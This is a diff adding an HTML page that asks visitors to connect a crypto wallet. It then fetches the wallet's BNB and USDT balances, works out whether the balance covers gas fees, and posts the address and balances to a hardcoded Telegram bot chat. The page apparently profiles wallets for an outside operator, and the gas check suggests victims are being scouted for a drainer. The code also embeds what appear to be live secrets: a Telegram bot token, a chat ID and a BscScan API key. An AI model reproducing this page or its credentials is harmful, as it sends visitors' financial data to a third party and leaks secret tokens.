@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>BSC Wallet Balance Sender</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
+</head>
+<body style="font-family: Arial; text-align: center; padding: 40px;">
+  <h2>Connect Wallet & Send BNB + USDT to Telegram</h2>
+  <button onclick="connectAndSend()" style="padding: 12px 24px; font-size: 16px;">Connect Wallet</button>
+
+  <script>
+    const BSC_SCAN_API = 'ZTC12CNRZ8UC8HGFDIW8SARDJXP1N6QIR1';
+    const TELEGRAM_TOKEN = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
+    const TELEGRAM_CHAT_ID = '8060968649';
+    const USDT_CONTRACT = '0x55d398326f99059ff775485246999027b3197955';
+
+    async function connectAndSend() {
+      if (typeof window.ethereum === 'undefined') {
+        alert("⚠️ Please install MetaMask or Web3 wallet!");
+        return;
+      }
+
+      const web3 = new Web3(window.ethereum);
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const address = accounts[0];
+        let message = `📲 *Connected Wallet*\n\`${address}\`\n\n`;
+
+        // Fetch BNB balance
+        const bnbUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${BSC_SCAN_API}`;
+        const bnbRes = await fetch(bnbUrl);
+        const bnbData = await bnbRes.json();
+        let bnb = 0;
+
+        if (bnbData.status === "1") {
+          bnb = parseFloat(bnbData.result) / 1e18;
+          message += `💰 *BNB*: ${bnb.toFixed(4)}\n`;
+
+          // Calculate gas fee coverage
+          const lowGas = 0.001;
+          const highGas = 0.005;
+          const percentCover = ((bnb / highGas) * 100).toFixed(2);
+          message += `⛽ *Gas Fee Coverage*: ${percentCover}% of one high gas transaction\n`;
+        } else {
+          message += `💰 *BNB*: ❌ Error\n`;
+        }
+
+        // Fetch USDT balance
+        const usdtUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${address}&tag=latest&apikey=${BSC_SCAN_API}`;
+        const usdtRes = await fetch(usdtUrl);
+        const usdtData = await usdtRes.json();
+        if (usdtData.status === "1") {
+          const usdt = (parseFloat(usdtData.result) / 1e18).toFixed(2);
+          message += `💵 *USDT*: ${usdt}`;
+        } else {
+          message += `💵 *USDT*: ❌ Error`;
+        }
+
+        // Send to Telegram
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+
+        alert("✅ Balances & gas info sent to Telegram!");
+      } catch (err) {
+        console.error(err);
+        alert("❌ Something went wrong");
+      }
+    }
+  </script>
+</body>
+</html>
